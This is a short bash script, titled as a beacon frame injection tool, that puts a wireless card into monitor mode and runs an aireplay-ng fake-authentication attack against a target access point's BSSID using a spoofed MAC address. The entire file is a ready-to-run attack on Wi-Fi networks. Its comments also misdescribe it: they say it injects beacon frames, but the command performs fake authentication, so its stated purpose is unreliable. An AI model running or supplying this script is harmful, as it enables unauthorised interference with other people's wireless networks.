#!/bin/bash

# Beacon Frame Injection Script

# Check if the necessary tools are installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "aireplay-ng could not be found. Please install aireplay-ng and try again."
    exit 1
fi

# Function to inject beacon frames
inject_beacon() {
    local target_bssid=$1
    local target_channel=$2
    local ssid=$3

    # Put the wireless interface in monitor mode
    echo "Putting wireless interface in monitor mode..."
    sudo airmon-ng start wlan0

    # Change to the target channel
    echo "Changing channel to $target_channel..."
    sudo iwconfig wlan0mon channel $target_channel

    # Inject beacon frames
    echo "Injecting beacon frames with SSID $ssid..."
    sudo aireplay-ng --fakeauth 0 -a $target_bssid -h 00:11:22:33:44:55 -e $ssid wlan0mon
}

# Main script
if [ $# -lt 3 ]; then
    echo "Usage: $0 <target_bssid> <target_channel> <ssid>"
    exit 1
fi

inject_beacon $1 $2 $3